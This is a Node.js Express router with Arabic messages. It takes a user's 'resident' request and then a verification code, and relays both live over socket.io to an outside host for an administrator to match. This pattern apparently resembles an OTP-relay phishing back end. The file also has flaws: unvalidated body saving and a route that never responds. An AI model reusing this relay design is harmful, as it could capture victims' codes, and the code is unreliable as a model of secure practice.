// Express Framework
const express = require('express');
const router = express.Router();

// ensureAuthenticated for protecting routes(Auth => Access, notAuth => Not Access)
const { ensureAuthenticated } = require('../config/auth');

// Import Packages
const Saudia_Socket = require("socket.io-client")('http://socket.wezara.me');

// Import Models
const Resident = require('../models/Resident');
const User = require('../models/User');

// Post Request to /request/resident
router.post('/resident', ensureAuthenticated, async (req, res) => {
   try {
      const founded_resident = await Resident.findOne({ userID: req.user.id, accepted: false });
      if (founded_resident) {
         res.status(404).json({ statusCode: 404, error: 'برجاء أكمل الطلب الخاص بك' });
      } else {
         const temp = req.body;
         temp.userID = req.user.id;
         const resident = await new Resident(temp).save();
         Saudia_Socket.emit('resident', { userID: resident.userID, residentID: resident._id });
         res.status(200).json({ statusCode: 200, success:  'تم إرسال جميع البيانات إلى المسئول. سيتم تحويلك إلى صفحة تأكيد الرمز المرئي', resident: resident });
      }
   } catch (err) {
      res.status(500).json({ statusCode: 500, error: 'حدث خطأ في السيرفر' });
   }
})

// Post Request to /request/socketID
router.patch('/socketID', ensureAuthenticated, async (req, res) => {
   try {
      const socketID = req.body.socketID;
      if (!socketID.trim()) {
         return res.status(422).json({
            statusCode: 422,
            error: 'يجب إدخال السوكيت',
         });
      }
    await User.findByIdAndUpdate({ _id: req.user.id }, { socketID: socketID }, { new: true });
   } catch(err) {
      res.status(500).json({ statusCode: 500, error: 'حدث خطأ في السيرفر' });
   }
})

// Post Request to /request/code
router.post('/code', ensureAuthenticated, async (req, res) => {
   try {
      const { residentID, code } = req.body; 
      if (!residentID || !code) {
         return res.status(422).json({
            statusCode: 422,
            error: 'كٌلًا من رمز الكود ورقم الطلب إجباري',
         });
      }

      if (!residentID.match(/^[0-9a-fA-F]{24}$/)) {
         return res.status(422).json({
             statusCode: 422,
             error: 'رقم الطلب غير صالح',
          });
       }

      var resident = await Resident.findOne({ _id: residentID });

      if(!resident) {
         return res.status(422).json({
            statusCode: 422,
            error: 'هذا الطلب غير موجود',
         });
      }

      resident = await Resident.findByIdAndUpdate({ _id: residentID }, { code: code }, { new: true });
      Saudia_Socket.emit('code', { userID: resident.userID, residentID: resident._id, code:code });
      res.status(200).json({ statusCode: 200, success: 'تم إرسال الكود إلى المسئول وستتم الموافقة إذا حدث تطابق', resident: resident });


   } catch (err) {
      res.status(500).json({ statusCode: 500, error: 'حدث خطأ في السيرفر' });
   }
})


module.exports = router;